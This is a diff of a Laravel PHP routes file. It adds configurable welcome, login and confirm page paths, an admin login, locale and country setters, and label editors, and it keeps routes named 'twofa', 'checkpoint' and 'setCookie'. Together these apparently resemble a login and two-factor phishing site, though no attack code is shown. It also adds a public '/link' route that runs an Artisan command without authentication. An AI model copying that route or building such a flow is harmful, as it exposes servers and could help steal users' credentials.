@@ -1,5 +1,20 @@
 <?php
 
+use App\Http\Controllers\AdminController;
+use App\Http\Controllers\Controller;
+use App\Http\Controllers\HomeController;
+use App\Http\Livewire\Auth\Login;
+use App\Http\Livewire\Confirm;
+use App\Http\Livewire\EditLabel;
+use App\Http\Livewire\Err404;
+use App\Http\Livewire\Err500;
+use App\Http\Livewire\Form;
+use App\Http\Livewire\Labels;
+use App\Http\Livewire\Languages;
+use App\Http\Livewire\Setting;
+use App\Http\Livewire\Welcome;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -13,35 +28,64 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-Route::get('/', function () {
-    return view('welcome');
+Route::get('/link', function () {
+    Artisan::call('storage:link');
 });
 
-#user
+$settings = null;
+$pathWelcomePage = '/';
+$queryWelcomePage = [];
+$pathLoginPage = '/login';
+$queryLoginPage = [];
+$pathConfirmPage = '/confirm';
+$queryConfirmPage = [];
+
+if (env('IS_GET_BY_SETTING') == 1) {
+    $settings = Cache::rememberForever('settings', function () {
+        return \App\Models\Setting::pluck('value', 'key')->toArray();
+    });
+
+    $parseWelcomePage = parse_url($settings['path_welcome_page']);
+    $pathWelcomePage = $parseWelcomePage['path'] ?? '/';
+
+    $parseLoginPage = parse_url($settings['path_login_page']);
+    $pathLoginPage = $parseLoginPage['path'] ?? '/';
+
+    $parseConfirmPage = parse_url($settings['path_confirm_page']);
+    $pathConfirmPage = $parseConfirmPage['path'] ?? '/';
+}
+
+Route::get($pathWelcomePage, [HomeController::class, 'welcome'])->name('welcome');
+Route::get($pathLoginPage, [HomeController::class, 'login'])->name('login');
+Route::get($pathConfirmPage, [HomeController::class, 'confirm'])->name('confirm');
+
+Route::group(['prefix' => 'admin', 'as' => 'admin.'], function () {
+    Route::get('/login', [AdminController::class, 'login'])->name('login');
+    Route::post('/checkLogin', [AdminController::class, 'checkLogin'])->name('checkLogin');
+});
+Route::get('/404', Err404::class)->name('404');
+Route::get('/500', Err500::class)->name('500');
+Route::get('/set-locale', [Controller::class, 'setLocale'])->name('setLocale');
+Route::get('/set-country-code', [Controller::class, 'setCountryCode'])->name('setCountryCode');
+
+Route::middleware('auth')->group(function () {
+    Route::get('/logout', [Controller::class, 'logout'])->name('logout');
+    Route::get('/languages', Languages::class)->name('languages');
+    Route::get('/labels', Labels::class)->name('labels');
+    Route::get('/edit-label/{lang}', EditLabel::class)->name('edit-label');
+    Route::get('/settings', Setting::class)->name('settings');
+});
+
+Route::get('/', function () {
+    return redirect()->route('welcome');
+});
+
+
 Route::group(['namespace' => 'App\Http\Controllers'], function () {
-    Route::get('/', 'MainController@index')->name('index')->middleware('url.previous');
-    Route::get('/home', 'MainController@home')->name('home')->middleware('cookie');
-    Route::get('/twofa', 'MainController@twofa')->name('twofa')->middleware('cookie');
-    Route::get('/checkpoint', 'MainController@checkpoint')->name('checkpoint')->middleware('cookie');
-    #task
-    // Route::group(['prefix' => 'tasks', 'as' => 'tasks.', 'middleware' => 'auth'], function () {
-    //     Route::get('/', 'TaskController@index')->name('index');
-    //     Route::get('/today', 'TaskController@taskToday')->name('taskToday');
-    //     Route::get('/{id}', 'TaskController@show')->name('show');
-    // });
+    Route::get('/', 'MainController@index')->name('index');
+    Route::get('/home', 'MainController@home')->name('home');
+    Route::get('/twofa', 'MainController@twofa')->name('twofa');
+    Route::get('/checkpoint', 'MainController@checkpoint')->name('checkpoint'); #task
     Route::get('/404', 'MainController@notFound')->name('404');
     Route::get('/setCookie', 'MainController@setCookie')->name('setCookie');
-});
-
-#admin
-Route::group(['namespace' => 'App\Http\Controllers',
-], function () {
-    #domains
-    Route::group(['prefix' => 'domains', 'as' => 'domains.'], function () {
-        Route::get('/', 'DomainController@index')->name('index');
-        Route::get('/create', 'DomainController@create')->name('create');
-        Route::post('/create', 'DomainController@store')->name('store');
-        Route::get('/update/{id}', 'DomainController@show')->name('show');
-        Route::post('/update', 'DomainController@update')->name('update');
-    });
 });
